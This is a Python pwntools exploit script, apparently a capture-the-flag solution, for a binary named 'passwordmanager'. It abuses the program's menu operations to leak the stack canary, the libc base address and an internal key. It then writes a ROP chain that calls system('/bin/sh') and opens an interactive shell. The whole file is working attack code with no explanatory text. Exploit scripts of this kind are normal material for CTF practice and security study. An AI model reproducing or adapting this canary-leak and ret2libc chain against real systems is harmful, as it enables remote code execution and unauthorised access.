#!/usr/bin/python3

from pwn import *

exe = ELF("passwordmanager", checksec=False)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(
            p,
            gdbscript="""
                b*lock_n_lock+679

                c
                """,
        )
        input()


info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
    p = remote("")
else:
    p = process(exe.path)


def create(idx, size, data):
    sla(b"> ", "1")
    sla(b": ", str(idx))
    sla(b": ", str(size))
    sa(b": ", data)


def edit(idx, data, option):
    sla(b"> ", "2")
    sla(b": ", str(idx))
    sa(b"New data: ", data)
    sla(b": ", option)


def delete(idx, option):
    sla(b"> ", "3")
    sla(b": ", str(idx))
    sla(b"]: ", option)


def encrypt():
    sla(b"> ", "4")


# 0x0000010000000100
create(0, 0x100, b"\n")
create(1, 0x100, b"\n")
create(2, 0x79, b"\n")
create(3, 0x100, b"\n")

delete(0, "y")
create(0, 0x0000030000000100, b"\n")

edit(1, b"\n", "y")
edit(2, b"a" * 0x79, "y")
sla(b"> ", "2")
sla(b": ", str(2))
p.recvuntil(b"a" * 0x78)
canary = u64(p.recv(8)) - 0x61
sa(b"New data: ", b"a")
sla(b": ", b"n")
info("Canary: " + hex(canary))

delete(2, "y")
create(2, 0x78 + 0x10, b"\n")
edit(2, b"a" * 0x88, "y")
sla(b"> ", "2")
sla(b": ", str(2))
p.recvuntil(b"a" * 0x88)
libc.address = u64(p.recv(6).ljust(8, b"\0")) - 0x29D90
sa(b"New data: ", b"a")
sla(b": ", b"n")
info("Libc: " + hex(libc.address))


delete(0, "y")
create(0, 0x0000001000000100, b"\n")
encrypt()
delete(0, "y")
create(0, 0x0000000800000100, b"\n")
edit(1, b"a" * 8, "y")

sla(b"> ", "2")
sla(b": ", str(1))
p.recvuntil(b"a" * 8)
key = u64(p.recv(8))
sa(b"New data: ", b"a")
sla(b": ", b"n")
info("key: " + hex(key))

delete(0, "y")
delete(1, "y")

rop = ROP(libc)
payload = flat(
    0,
    canary,
    0,
    rop.find_gadget(["ret"]).address,
    rop.find_gadget(["pop rdi", "ret"]).address,
    next(libc.search(b"/bin/sh\0")),
    libc.sym.system,
)
edit(2, payload, "y")
create(0, 0x0000014000000100, b"\n")
sla(b"> ", "2")
GDB()
sla(b": ", str(1))


p.interactive()
